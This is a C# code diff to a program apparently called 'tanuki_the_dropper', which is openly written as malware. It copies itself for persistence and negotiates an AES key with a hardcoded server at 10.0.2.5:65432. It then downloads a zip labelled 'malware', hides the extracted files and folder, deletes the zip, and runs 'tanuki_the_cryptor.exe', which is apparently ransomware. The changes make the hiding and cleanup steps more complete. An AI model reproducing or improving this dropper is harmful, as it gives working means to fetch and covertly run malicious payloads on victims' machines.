@@ -15,8 +15,6 @@ namespace tanuki_the_dropper
         
         static void Main(string[] args)
         {
-            Console.WriteLine("tanuki!!!!!!!!");
-
             Persistence persistence = new Persistence();
             persistence.SelfCopy();
 
@@ -31,12 +29,21 @@ namespace tanuki_the_dropper
     {
         private BigInteger dh_key;
         private BigInteger aes_key;
-        private Communication comm;
+
+        private Communication comm = null;
+        string server = "10.0.2.5";
+        int port = 65432;
+
+        private static string basePath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
+        private string zipPath =  basePath + @"\malware.zip";
+        private string extractFolder = basePath + @".\malware";
+
         private int RetryTimes = 3;
         private int WaitTime = 6000;
 
         public void Execute()
         {
+            Console.WriteLine(zipPath);
             for (int i = 0; i < RetryTimes; i++)
             {
                 try
@@ -59,7 +66,7 @@ namespace tanuki_the_dropper
             BigInteger gx;
             try
             {
-                comm = new Communication("10.0.2.5", 65432);
+                comm = new Communication(server, port);
 
                 byte[] keyGenRequest_bytes = Packet.GenNewRequest("keyExchangeGen");
 
@@ -79,7 +86,7 @@ namespace tanuki_the_dropper
 
                 aes_key = new BigInteger(Cryptography.ComputeAESKey(dh_key.ToString("X")));
 
-                Console.WriteLine("AES Key hex: " + ByteArrayToString(this.aes_key.ToByteArray()));
+                Console.WriteLine("AES Key hex: " + Convert.ToHexString(this.aes_key.ToByteArray()));
             }
             catch (Exception ex)
             {
@@ -98,6 +105,8 @@ namespace tanuki_the_dropper
 
         private void ExeExec()
         {
+            CleanDownload();
+
             try
             {
                 (byte[] exeZip_bytes, int bytesRead) = (null, 0);
@@ -138,17 +147,23 @@ namespace tanuki_the_dropper
                 }
 
                 Console.WriteLine("Writing zip.");
-                Console.WriteLine("Bytes recieved: " + bytesRead);
-                Console.WriteLine("Bytes zip: " + bytesRead);
-                using (FileStream file = new FileStream("malware.zip", FileMode.Create, FileAccess.Write))
+
+                using (FileStream file = new FileStream(zipPath, FileMode.Create, FileAccess.Write))
                 {
                     file.Write(exeZip_bytes, 0, exeZip_bytes.Length);
-                    //File.SetAttributes("malware.zip", File.GetAttributes("malware.zip") | FileAttributes.Hidden);
                 }
 
                 Console.WriteLine("Extracting zip.");
-                ZipFile.ExtractToDirectory("malware.zip", ".\\malware");
-                foreach(string file in Directory.GetFiles(".\\malware"))
+                ZipFile.ExtractToDirectory(zipPath, extractFolder);
+
+                DirectoryInfo extrDir = new DirectoryInfo(extractFolder);
+                extrDir.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+
+                File.Delete(zipPath);
+
+                Console.WriteLine("Binary file received and saved.");
+
+                foreach (string file in Directory.GetFiles(extractFolder))
                 {
                     File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
                 }
@@ -156,21 +171,15 @@ namespace tanuki_the_dropper
                 byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                 comm.SendMessage(endRequest_bytes);
 
-                Exec.ExecProgram(".\\malware\\tanuki_the_cryptor.exe");
+                Exec.ExecProgram(extractFolder + "\\tanuki_the_cryptor.exe");
 
-                Console.WriteLine("Binary file received and saved.");
+                
             }
             catch (Exception ex)
             {
                 Console.WriteLine("Could not execute malware: " + ex.Message);
 
-                if (File.Exists("malware.zip")) { File.Delete("malware.zip"); }
-                if (Directory.Exists("malware"))
-                {
-                    foreach (string file in Directory.EnumerateFiles("malware"))
-                        File.Delete(file);
-                    Directory.Delete("malware");
-                }
+                CleanDownload();
 
                 byte[] endRequest_bytes = Packet.GenNewRequest("endRequest");
                 comm.SendMessage(endRequest_bytes);
@@ -181,12 +190,15 @@ namespace tanuki_the_dropper
 
         }
 
-        public static string ByteArrayToString(byte[] ba)
+        private void CleanDownload()
         {
-            StringBuilder hex = new StringBuilder(ba.Length * 2);
-            foreach (byte b in ba)
-                hex.AppendFormat("{0:x2}", b);
-            return hex.ToString();
+            if (File.Exists(zipPath)) { File.Delete(zipPath); }
+            if (Directory.Exists(extractFolder))
+            {
+                foreach (string file in Directory.EnumerateFiles(extractFolder))
+                    File.Delete(file);
+                Directory.Delete(extractFolder);
+            }
         }
 
     }
